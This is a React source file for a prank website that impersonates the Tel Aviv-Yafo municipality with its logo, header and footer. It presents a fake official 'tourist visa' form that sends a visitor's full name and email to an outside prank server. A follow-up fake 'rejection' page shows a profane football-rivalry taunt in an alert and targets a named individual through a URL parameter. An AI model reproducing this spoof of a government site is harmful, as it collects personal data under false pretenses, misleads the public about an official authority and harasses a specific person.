import React, { useState, useRef, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useSearchParams } from 'react-router-dom';
import './App.css';
import './VideoPage.css';

function TlvHeader() {
  return (
    <>
      <header className="tlv-header">
        <div className="tlv-header-inner">
          <nav className="tlv-nav">
            <a href="#">נגישות</a>
            <a href="#">מוקד 106</a>
            <a href="#">דף הבית</a>
          </nav>
          <div className="tlv-logo-group">
            <div className="tlv-brand">
              <span className="tlv-city-name">עיריית תל-אביב-יפו</span>
              <span className="tlv-city-sub">שירותים לתושב</span>
            </div>
            <img
              src="https://www.tel-aviv.gov.il/_layouts/15/TlvSP2013PublicSite/images/logo.png"
              alt="עיריית תל אביב-יפו"
              className="tlv-logo"
              onError={(e) => { e.target.style.display = 'none'; }}
            />
          </div>
        </div>
      </header>
      <div className="tlv-accent-bar" />
    </>
  );
}

function TlvFooter() {
  return (
    <footer className="tlv-footer">
      <div className="tlv-footer-inner">
        <p>© 2026 עיריית תל-אביב-יפו | כל הזכויות שמורות | <a href="#">מדיניות פרטיות</a> | <a href="#">נגישות</a></p>
      </div>
    </footer>
  );
}

function FormPage() {
  const [formData, setFormData] = useState({ name: '', email: '' });
  const [status, setStatus] = useState('idle');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('loading');

    try {
      const response = await fetch('https://tlvy-prank-1.onrender.com/send-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fullName: formData.name,
          email: formData.email,
        }),
      });

      if (response.ok) {
        setStatus('success');
        setFormData({ name: '', email: '' });
      } else {
        setStatus('error');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      setStatus('error');
    }
  };

  return (
    <div className="main-wrapper" dir="rtl">
      <TlvHeader />

      <main className="tlv-main">
        <div className="breadcrumb">
          <a href="#">דף הבית</a> &rsaquo; <a href="#">תושבים</a> &rsaquo; הנפקת ויזת תייר
        </div>

        <div className="container">
          <h1>הנפקת ויזת תייר לתל אביב</h1>
          <p className="subtitle">מערכת הרישום הרשמית של עיריית תל אביב. האישור יישלח לכתובת המייל המצורפת.</p>

          {status === 'success' ? (
            <div className="success-message">
              <div className="success-header">
                <span className="check-icon">✓</span>
                <h3>הבקשה התקבלה בהצלחה!</h3>
              </div>
              <p className="success-text">בקשתך הועברה לבחינה</p>
              <button onClick={() => setStatus('idle')}>שלח בקשה נוספת</button>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="form-container">
              <div className="input-group">
                <label>שם מלא:</label>
                <input
                  type="text"
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  required
                  placeholder="הכנס שם מלא"
                />
              </div>

              <div className="input-group">
                <label>כתובת אימייל:</label>
                <input
                  type="email"
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  required
                  placeholder="כתובת אימייל תקינה"
                />
              </div>

              <button type="submit" disabled={status === 'loading'}>
                {status === 'loading' ? 'מעבד נתונים...' : 'לצפייה בסיבת הדחייה'}
              </button>

              {status === 'error' && (
                <p className="error-message">שגיאת תקשורת עם השרת. ודא שהשרת ב-Render רץ.</p>
              )}
            </form>
          )}
        </div>
      </main>

      <TlvFooter />
    </div>
  );
}

function FloatingTaText() {
  const [items, setItems] = useState([]);
  const counterRef = useRef(0);

  useEffect(() => {
    const addPair = () => {
      const id = counterRef.current++;
      const ids = [`${id}L`, `${id}R`];
      setItems(prev => [
        ...prev,
        { id: ids[0], side: 'left',  top: 10 + Math.random() * 75 },
        { id: ids[1], side: 'right', top: 10 + Math.random() * 75 },
      ]);
      setTimeout(() => {
        setItems(prev => prev.filter(i => !ids.includes(i.id)));
      }, 2800);
    };

    addPair();
    const interval = setInterval(addPair, 3000);
    return () => clearInterval(interval);
  }, []);

  return (
    <>
      {items.map(item => (
        <span
          key={item.id}
          className={`ta-float ta-float-${item.side}`}
          style={{ top: `${item.top}%` }}
        >
          תל אביב צהובה
        </span>
      ))}
    </>
  );
}

function VideoPage() {
  const [hasStarted, setHasStarted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const audioRef = useRef(null);
  const [searchParams] = useSearchParams();
  const isTomer = ['תומר', 'תומר לוי'].includes((searchParams.get('n') || '').trim());

  const handleStart = () => {
    setIsLoading(true);

    if (audioRef.current) {
      audioRef.current.play().then(() => {
        audioRef.current.pause();
      }).catch(err => console.log(err));
    }

    setTimeout(() => {
      window.alert("תל אביב צהובה\nתשתחוו יבני זונות");

      setHasStarted(true);

      if (audioRef.current) {
        audioRef.current.volume = 0.5;
        audioRef.current.currentTime = 174;
        audioRef.current.play();
      }
    }, 2000);
  };

  return (
    <>
      <audio ref={audioRef} loop preload="auto">
        <source src="/song.mp3" type="audio/mpeg" />
      </audio>

      {hasStarted ? (
        <div className="video-page-wrapper" dir="rtl">
          <img src="/bg-image.jpg" alt="Background" className="background-image" />
          <div className="video-overlay"></div>
          <FloatingTaText />
          <div className="karaoke-container">
            {isTomer && (
              <h2 className="tomer-text">אין כניסה גם לא לפלודה</h2>
            )}
            <h1 className="karaoke-text">
              אני מכבי<br />מי אתם בכלל!
            </h1>
          </div>
        </div>
      ) : (
        <div className="main-wrapper" dir="rtl">
          <TlvHeader />
          <main className="tlv-main">
            <div className="breadcrumb">
              <a href="/">דף הבית</a> &rsaquo; <a href="#">תושבים</a> &rsaquo; סטטוס בקשה
            </div>
            <div className="container">
              <div className="rejection-notice">
                <span className="rejection-icon">✗</span>
                <span>הבקשה נדחתה</span>
              </div>
              <h1>תוצאת הבקשה</h1>
              <p className="subtitle">בקשתך נבחנה ונדחתה. לצפייה בסיבת הדחייה, לחץ על הכפתור.</p>
              <button
                onClick={handleStart}
                className="tlv-submit-btn"
                disabled={isLoading}
              >
                {isLoading ? 'מאמת נתונים מול השרת...' : 'לצפייה בסיבת הדחייה לחץ כאן'}
              </button>
            </div>
          </main>
          <TlvFooter />
        </div>
      )}
    </>
  );
}

export default function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<FormPage />} />
        <Route path="/video-page" element={<VideoPage />} />
      </Routes>
    </Router>
  );
}
